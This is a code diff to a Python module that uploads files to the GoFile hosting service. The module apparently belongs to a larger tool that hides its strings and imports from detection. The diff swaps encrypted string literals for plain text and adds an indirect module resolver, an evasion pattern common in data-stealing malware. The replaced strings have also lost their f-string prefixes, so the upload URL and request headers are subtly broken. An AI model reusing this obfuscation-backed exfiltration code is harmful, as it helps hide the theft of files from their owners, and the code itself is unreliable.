@@ -1,10 +1,12 @@
-import os
-import json
-import urllib.request
-import urllib.parse
+from core.resolver import (Resolver, _URLLIB_PARSE)
+urllib.parse = Resolver.get_mod(_URLLIB_PARSE)
+
+from core.resolver import (Resolver, _OS, _JSON, _UUID)
+os = Resolver.get_mod(_OS)
+json = Resolver.get_mod(_JSON)
+uuid = Resolver.get_mod(_UUID)
+
 import mimetypes
-import uuid
-from core.obfuscation import decrypt_string
 
 class CloudModule:
     """Модуль для выгрузки больших файлов на внешние сервисы (GoFile)"""
@@ -13,7 +15,7 @@ class CloudModule:
     def get_best_server():
         """Получение лучшего сервера GoFile"""
         try:
-            with urllib.request.urlopen(decrypt_string("BkYMGz1rdk07BwMWFVYAEwJXVgIhfj4HLjUPSwZqAwgYVwo=")) as response:
+            with urllib.request.urlopen("https://api.gofile.io/getBestServer") as response:
                 data = json.loads(response.read().decode())
                 if data['status'] == 'ok':
                     return data['data']['server']
@@ -28,29 +30,29 @@ class CloudModule:
             return None
             
         if status_callback:
-            status_callback(decrypt_string("vq2o1Z7qiOGL8LqNooS2wr6HWLrPgeyz2qfY6Mfo5qreEqjfnuqI7Xqn3ejC6dWr7uP7u/mB47LiWUQW"))
+            status_callback("Получение сервера для загрузки...")
             
         server = CloudModule.get_best_server()
-        url = decrypt_string("BkYMGz1rdk0hBA9KBFwUB0BVFw0nPTxMMxhFTQJVCRsKdBEHKw==")
+        url = "https://{server}.gofile.io/uploadFile"
         
         try:
             boundary = str(uuid.uuid4())
-            content_type = decrypt_string("A0cUHychOBAuWAxXAFRLHg9GGVBuMzYXNBMLSgsEHRgBRxYPLyMgHw==")
+            content_type = "multipart/form-data; boundary={boundary}"
             filename = os.path.basename(file_path)
             
             # Подготовка заголовка и подвала multipart
             header = (
-                decrypt_string("Qx8DCSEkNwY7BRNFLks6FA==") +
-                decrypt_string('LV0WHys/LU8eHhlIHUoPDgddFlFuNzYQN1oOWQZYXVoAUxUOc3M/CzYSSANSXw8WC1wZBitsexk8HgZdHFgLHxMQJBkSPw==') +
-                decrypt_string("LV0WHys/LU8ODhpdSBkdFwdfHR83ITwRdBAfXQFKOQ4XQh1DKDg1BwUHC0waED1KMxIXGW52OBIqGwNbE00PFQAdFwg6NC1PKQMYXRNUQQcyQCQFEiMFDA==")
+                "--{boundary}\\r\\n" +
+                "Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\\r\\n" +
+                "Content-Type: {mimetypes.guess_type(file_path)[0] or \'application/octet-stream\'}\\r\\n\\r\\n"
             ).encode()
-            footer = decrypt_string("MkAkBWN8IgA1AgRcE0sfB0MfJBkSPw==").encode()
+            footer = "\\r\\n--{boundary}--\\r\\n".encode()
             
             file_size = os.path.getsize(file_path)
             total_size = len(header) + file_size + len(footer)
 
             if status_callback:
-                status_callback(decrypt_string("vqWo257iiOKL9LqPooO2yk7iykue74nTisy6iKKDtsROGgMNJz08PSkeEF1SFklaXwJKX25+dkJrR1gMDxkrOEccVkU="))
+                status_callback("Загрузка в облако ({file_size // 1024 // 1024} MB)...")
 
             # Кастомный класс для потоковой передачи данных в urllib
             class StreamBody:
@@ -105,12 +107,12 @@ class CloudModule:
             finally:
                 body_stream.close()
         except Exception as e:
-            print(decrypt_string("NRMlSw09Nhc+Vz9IHlYHHk53ChkhI2NCIRIX"))
+            print("[!] Cloud Upload Error: {e}")
         return None
 
 if __name__ == "__main__":
-    test_file = decrypt_string("GlcLH2AlIRY=")
+    test_file = "test.txt"
     with open(test_file, "w") as f: f.write("Hello GoFile!")
-    link = CloudModule.upload_file(test_file, lambda s: print(decrypt_string("PUYZHzsiY0IhBBc=")))
-    print(decrypt_string("IlsWAHRxIg4zGQFF"))
+    link = CloudModule.upload_file(test_file, lambda s: print("Status: {s}"))
+    print("Link: {link}")
     if os.path.exists(test_file): os.remove(test_file)
